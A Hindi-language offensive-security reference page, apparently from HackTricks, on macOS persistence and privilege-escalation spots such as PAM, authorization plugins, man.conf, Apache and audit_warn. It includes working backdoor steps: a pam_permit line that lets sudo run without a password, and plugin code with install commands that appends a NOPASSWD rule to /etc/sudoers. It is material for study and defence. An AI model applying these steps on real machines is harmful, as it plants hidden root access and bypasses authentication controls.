PAM मुख्यतः macOS के भीतर आसान निष्पादन की तुलना में **persistence** और malware में अधिक केंद्रित है, इसलिए यह ब्लॉग विस्तृत व्याख्या नहीं देगा — इस तकनीक को बेहतर समझने के लिए **writeups पढ़ें**।

PAM मॉड्यूल जांचें:
```bash
ls -l /etc/pam.d
```
PAM का दुरुपयोग करके की जाने वाली एक persistence/privilege escalation technique /etc/pam.d/sudo मॉड्यूल को संशोधित करके और शुरुआत में निम्न लाइन जोड़ने जितनी आसान है:
```bash
auth       sufficient     pam_permit.so
```
तो यह कुछ इस तरह **दिखेगा**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
और इसलिए **`sudo` का उपयोग करना काम करेगा**।

> [!CAUTION]
> ध्यान दें कि यह डायरेक्टरी TCC द्वारा संरक्षित है, इसलिए यह बहुत संभावना है कि उपयोगकर्ता से एक्सेस के लिए एक प्रॉम्प्ट मांगा जाएगा।

एक और अच्छा उदाहरण su है, जहाँ आप देख सकते हैं कि PAM modules को पैरामीटर देना भी संभव है (और आप इस फ़ाइल को backdoor भी कर सकते हैं):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- sandbox को बायपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आपको root होना चाहिए और अतिरिक्त configs करने होंगे
- TCC bypass: ???

#### स्थान

- `/Library/Security/SecurityAgentPlugins/`
- Root आवश्यक है
- plugin का उपयोग करने के लिए authorization database को configure करना भी आवश्यक है

#### विवरण & Exploitation

आप एक authorization plugin बना सकते हैं जो user के logs-in करने पर execute होगा ताकि persistence बनी रहे। इन plugins में से एक कैसे बनाते हैं, इसके बारे में अधिक जानकारी के लिए पिछले writeups देखें (और सावधान रहें — एक poorly written plugin आपको lock कर सकती है और आपको अपने mac को recovery mode से clean करना पड़ सकता है)।
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
बंडल को लोड करने के लिए स्थान पर **ले जाएँ**:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
अंत में इस Plugin को लोड करने के लिए **नियम** जोड़ें:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** authorization framework को बताएगा कि इसे authorization के लिए किसी external mechanism को **call** करने की आवश्यकता होगी। इसके अलावा, **`privileged`** इसे root द्वारा चलाएगा।

इसे ट्रिगर करें:
```bash
security authorize com.asdf.asdf
```
और फिर **staff समूह के पास sudo एक्सेस होना चाहिए** (पुष्टि के लिए `/etc/sudoers` पढ़ें)।

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- sandbox को bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आपको root होना चाहिए और user को man का उपयोग करना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- root आवश्यक
- **`/private/etc/man.conf`**: जब भी man का उपयोग किया जाए

#### Description & Exploit

कॉन्फ़िग फाइल **`/private/etc/man.conf`** यह संकेत देती है कि man documentation फ़ाइलें खोलते समय कौन सा binary/script उपयोग किया जाएगा। इसलिए executable के path को संशोधित किया जा सकता है ताकि जब भी user किसी डॉक्यूमेंट को पढ़ने के लिए man का उपयोग करे, एक backdoor execute हो जाए।

For example set in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
और फिर `/tmp/view` को इस तरह बनाएं:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- bypass sandbox के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन इसके लिए आपको root होना चाहिए और apache चल रहा होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd के पास entitlements नहीं हैं

#### Location

- **`/etc/apache2/httpd.conf`**
- Root आवश्यक है
- Trigger: जब Apache2 शुरू होता है

#### विवरण & Exploit

आप `/etc/apache2/httpd.conf` में किसी module को लोड करने के लिए एक लाइन जोड़कर संकेत दे सकते हैं, जैसे:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
इस तरह आपका कम्पाइल किया हुआ module Apache द्वारा लोड होगा। केवल एक बात है कि या तो आपको **इसे एक वैध Apple प्रमाणपत्र के साथ sign करना होगा**, या आपको सिस्टम में **एक नया trusted प्रमाणपत्र जोड़ना होगा** और **इसे उसके साथ sign करना होगा**।

फिर, यदि आवश्यक हो, यह सुनिश्चित करने के लिए कि सर्वर शुरू हो जाएगा, आप निम्नलिखित निष्पादित कर सकते हैं:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb के लिए कोड उदाहरण:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM ऑडिट फ्रेमवर्क

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- sandbox को बायपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आपको root होना चाहिए, auditd चालू होना चाहिए और एक चेतावनी उत्पन्न करनी होगी
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`/etc/security/audit_warn`**
- root आवश्यक
- **Trigger**: जब auditd एक चेतावनी का पता लगाता है

#### विवरण & Exploit

जब भी auditd एक चेतावनी का पता लगाता है, स्क्रिप्ट **`/etc/security/audit_warn`** **चलाई जाती है**। इसलिए आप इसमें अपना payload जोड़ सकते हैं।
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
आप `sudo audit -n` के साथ एक चेतावनी उत्पन्न कर सकते हैं।

### Startup Items

> [!CAUTION] > **यह अप्रचलित है, इसलिए उन निर्देशिकाओं में कुछ भी नहीं होना चाहिए।**

The **StartupItem** is a directory that should be positioned within either `/Library/StartupItems/` or `/System/Library/StartupItems/`. Once this directory is established, it must encompass two specific files:

1. An **rc script**: एक shell script जो startup के समय execute होती है।
2. A **plist file**, specifically named `StartupParameters.plist`, जिसमें विभिन्न विन्यास सेटिंग्स होती हैं।

सुनिश्चित करें कि दोनों rc script और `StartupParameters.plist` फ़ाइल सही तरह से **StartupItem** डायरेक्टरी के अंदर रखी गई हों ताकि startup प्रक्रिया उन्हें पहचानकर उपयोग कर सके।

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> मैं अपने macOS में इस घटक को नहीं ढूँढ पाया — अधिक जानकारी के लिए writeup देखें

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Apple द्वारा प्रस्तुत, **emond** एक लॉगिंग मैकेनिज़्म है जो अधविकसित या संभवतः परित्यक्त दिखता है, फिर भी उपलब्ध रहता है। Mac व्यवस्थापक के लिए यह विशेष रूप से लाभकारी नहीं है, पर यह अस्पष्ट सेवा threat actors के लिए एक सूक्ष्म persistence तरीका बन सकती है, जिसे अधिकांश macOS admins शायद नज़रअंदाज़ कर दें।

इसके अस्तित्व से परिचित लोगों के लिए, **emond** के किसी भी malicious उपयोग की पहचान सरल है। सिस्टम का LaunchDaemon इस सेवा के लिए एक ही directory में execute करने के लिए scripts खोजता है। इसे जांचने के लिए, निम्नलिखित command का उपयोग किया जा सकता है:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### स्थान

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root आवश्यक
- **Trigger**: XQuartz के साथ

#### विवरण & Exploit

XQuartz **अब macOS में स्थापित नहीं है**, इसलिए अधिक जानकारी के लिए writeup देखें।

### ~~kext~~

> [!CAUTION]
> kext को install करना, यहां तक कि root के रूप में भी, इतना जटिल है कि मैं इसे sandboxes से बाहर निकलने या persistence के लिए विचार नहीं करूंगा (जब तक आपके पास कोई exploit न हो)

#### स्थान

एक KEXT को startup आइटम के रूप में स्थापित करने के लिए, इसे **निम्नलिखित स्थानों में से किसी एक पर स्थापित** होना चाहिए:

- `/System/Library/Extensions`
- OS X operating system में निर्मित KEXT फ़ाइलें।
- `/Library/Extensions`
- 3rd party software द्वारा स्थापित KEXT फ़ाइलें

आप वर्तमान में लोड किए गए kext फ़ाइलों को निम्न के साथ सूचीबद्ध कर सकते हैं:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

रिपोर्ट: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### स्थान

- **`/usr/local/bin/amstoold`**
- Root required

#### विवरण & Exploitation

प्रकट होता है कि `/System/Library/LaunchAgents/com.apple.amstoold.plist` का `plist` इस binary का उपयोग कर रहा था जबकि यह एक XPC service को एक्सपोज़ कर रहा था... बात यह है कि वह binary मौजूद नहीं था, इसलिए आप वहां कुछ रख सकते थे और जब XPC service कॉल होती, आपका binary कॉल होगा।

मैं इसे अब अपने macOS में नहीं ढूंढ पा रहा हूँ।

### ~~xsanctl~~

रिपोर्ट: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### स्थान

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root required
- **Trigger**: जब सेवा चलायी जाती है (कभी-कभार)

#### विवरण & exploit

प्रकट होता है कि यह script चलाना बहुत आम नहीं है और मैं इसे अपने macOS में भी नहीं ढूंढ पाया, इसलिए यदि आप और जानकारी चाहते हैं तो रिपोर्ट देखें।

### ~~/etc/rc.common~~

> [!CAUTION] > **यह आधुनिक MacOS संस्करणों में काम नहीं कर रहा है**

यहाँ ऐसे **commands जो startup पर निष्पादित होंगे।** रखे जा सकते हैं। उदाहरण के रूप में सामान्य rc.common स्क्रिप्ट:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence techniques and tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## संदर्भ

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
